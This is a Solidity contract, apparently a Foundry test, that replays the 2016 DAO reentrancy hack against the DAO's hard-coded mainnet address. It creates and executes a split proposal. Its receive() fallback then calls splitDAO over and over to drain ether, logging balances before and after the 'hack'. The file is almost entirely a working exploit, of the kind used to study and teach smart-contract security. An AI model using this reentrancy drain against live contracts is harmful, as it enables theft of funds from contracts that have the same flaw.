// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

import "./Helper.sol";

contract DaoExploit is Test {
    IDAO constant dao = IDAO(0xBB9bc244D798123fDe783fCc1C72d3Bb8C189413);

    Helper helper;
    uint256 currentRun = 0;
    uint256 timesToRun;
    uint256 proposalID;

    constructor(address _helper, uint256 _runs) {
        helper = Helper(_helper);
        timesToRun = _runs;
    }

    function createVoteAndExecuteProposal() external {
        // Create a new proposal
        proposalID = dao.newProposal(address(this), 0, "the dao hack", new bytes(0), 0x93a80, true);
        console.log("Proposal created");

        // vote on proposal
        dao.vote(proposalID, true);

        // Forward time after waiting period
        vm.warp(block.timestamp + 8 days);

        // Execute the proposal
        dao.executeProposal(proposalID, new bytes(0));
        console.log("Proposal executed");

        dao.transfer(address(helper), dao.balanceOf(address(this)));
        console.log("Total Eth in contract before Hack", address(this).balance);
    }

    function splitDao() internal {
        // make split
        dao.splitDAO(proposalID, address(this));
    }

    function exploit() external {
        // Get tokens from helper
        helper.pullDAOTokens();
        splitDao();
    }

    receive() external payable {
        // console.log("Received Eth", address(this).balance);

        if (currentRun <= timesToRun) {
            // Re-enter the contract to drain eth
            currentRun++;
            splitDao();
        } else {
            // Return the tokens back to helper
            dao.transfer(address(helper), dao.balanceOf(address(this)));
            console.log("Total eth in contract after Hack", address(this).balance);
            console.log("Total eth in contract after Hack", (address(0xC0ee9dB1a9E07cA63E4fF0d5FB6F86Bf68D47b89).balance));
        }
    }
}
